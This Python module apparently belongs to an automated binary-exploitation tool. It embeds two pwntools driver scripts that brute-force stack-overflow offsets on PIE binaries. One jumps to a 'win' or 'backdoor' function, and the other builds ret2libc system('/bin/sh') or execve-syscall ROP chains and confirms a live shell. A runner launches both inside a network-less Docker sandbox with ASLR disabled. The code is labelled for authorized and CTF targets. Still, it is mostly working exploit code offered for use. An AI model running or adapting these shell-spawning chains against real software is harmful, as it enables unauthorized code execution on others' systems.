"""ret2win on PIE binaries, verified by execution.

PIE randomizes the base, so win()'s address is base+offset. With ASLR disabled in the
sandbox the base is fixed; we resolve it (io.libs / /proc maps / the standard ASLR-off PIE
base), search the stack offset and alignment, jump to win() and confirm it. For AUTHORIZED /
CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

import os
import shutil
import subprocess

_DRIVER = r'''
import sys, os
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
win_off = None
for n, a in (elf.symbols or {}).items():
    if n == "win" or n.endswith("win") or n in ("shell", "backdoor"):
        win_off = a; break
if win_off is None:
    print("NO_WIN"); sys.exit(1)
try:
    ret_off = ROP(elf).find_gadget(["ret"]).address
except Exception:
    ret_off = None
def resolve_base(io):
    for path, b in (io.libs() or {}).items():
        if os.path.basename(path) == os.path.basename(elf.path) and b:
            return b
    try:
        bases = [int(line.split("-")[0], 16) for line in open("/proc/%d/maps" % io.pid)
                 if os.path.basename(elf.path) in line]
        if bases:
            return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
    except Exception:
        pass
    return 0x555555554000
MARK = b"win reached"
for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48]:
    for a in (1, 0):
        io = process([elf.path], aslr=False)
        base = resolve_base(io)
        chain = b"A" * off + (p64(base + ret_off) if (a and ret_off is not None) else b"") + p64(base + win_off)
        io.sendline(chain)
        out = io.recvrepeat(1.0)
        io.close()
        if MARK in out:
            print("VERIFIED off=%d base=%#x win=%#x" % (off, base, base + win_off))
            sys.exit(0)
print("NOT_VERIFIED"); sys.exit(1)
'''


_DRIVER_ROP = r'''
import sys, os, time
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
def resolve_base(io):
    for path, b in (io.libs() or {}).items():
        if os.path.basename(path) == os.path.basename(elf.path) and b:
            return b
    try:
        bases = [int(line.split("-")[0], 16) for line in open("/proc/%d/maps" % io.pid)
                 if os.path.basename(elf.path) in line]
        if bases:
            return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
    except Exception:
        pass
    return 0x555555554000
MARK = b"BINORACLE_PWNED"
# ASLR is off in the sandbox, so once we resolve the (fixed) PIE base every gadget/string is
# at base+offset; we rebase the ELF, build a ROP chain and confirm a real shell via MARK.
for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 200]:
    io = process([elf.path], aslr=False)
    base = resolve_base(io)
    elf.address = base                      # rebases symbols, gadgets and search() to absolute
    binsh = next(elf.search(b"/bin/sh\x00"), None)
    rop = ROP(elf)
    built = False
    try:
        sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
        if binsh is not None and sysaddr:
            try: rop.raw(rop.find_gadget(["ret"]).address)
            except Exception: pass
            rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
        elif binsh is not None:
            rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
            sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
            if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
    except Exception:
        built = False
    if not built:
        io.close(); continue
    try:
        chain = rop.chain()
    except Exception:
        io.close(); continue
    try:
        io.sendline(b"A" * off + chain)
        time.sleep(0.5); io.sendline(b"echo " + MARK)
        out = io.recvrepeat(2.5)                 # generous: the audit runs many sandboxes, load is high
    except Exception:
        out = b""
    io.close()
    if MARK in out:
        print("VERIFIED off=%d base=%#x strategy=rop-pie" % (off, base)); sys.exit(0)
print("NOT_VERIFIED"); sys.exit(1)
'''


def _run_pie_driver(binary: str, driver: str, tmpname: str) -> dict:
    """Shared runner: write `driver` next to the binary and execute it in the binoracle-pwn
    sandbox (ASLR off, no network). Returns {ok, verified, detail, output, note}."""
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    try:
        img = subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                             capture_output=True, timeout=15).returncode
    except subprocess.TimeoutExpired:
        return {"ok": False, "note": "docker no responde (image inspect timeout)"}
    if img != 0:
        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    if not os.path.isdir(d):
        return {"ok": False, "note": f"directorio del binario inexistente: {d}"}
    drv = os.path.join(d, tmpname)
    try:
        with open(drv, "w") as f:
            f.write(driver)
    except OSError as e:
        return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
    try:
        r = subprocess.run(
            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "bash", "-c",
             f"chmod +x ./{name}; python3 {tmpname} {name}"],
            capture_output=True, text=True, timeout=200)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = "[timeout]"
    finally:
        try: os.unlink(drv)
        except OSError: pass
    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:]}


def autopie_rop(binary: str, run: bool = True) -> dict:
    """ROP-to-shell on a PIE binary, verified by execution. Resolves the (ASLR-off) PIE base in
    the sandbox, rebases the ELF, builds a ret2libc-system or execve-syscall ROP chain with
    absolute addresses and confirms a real shell. Needs '/bin/sh' present and enough gadgets;
    otherwise reports not-applicable. For AUTHORIZED / CTF targets."""
    res = _run_pie_driver(binary, _DRIVER_ROP, ".binoracle_pie_rop.py")
    if not res.get("ok"):
        return res
    res["note"] = ("ROP en PIE: base resuelta y shell verificada en sandbox" if res.get("verified")
                   else "ROP en PIE: no verificado (offset/gadget o timing bajo carga)")
    return res


def autopie_ret2win(binary: str, run: bool = True) -> dict:
    """ret2win on a PIE binary, verified by execution (shares the sandbox runner)."""
    res = _run_pie_driver(binary, _DRIVER, ".binoracle_pie.py")
    if res.get("ok"):
        res["note"] = "ret2win en PIE (base resuelta, shell/win verificada en sandbox)"
    return res
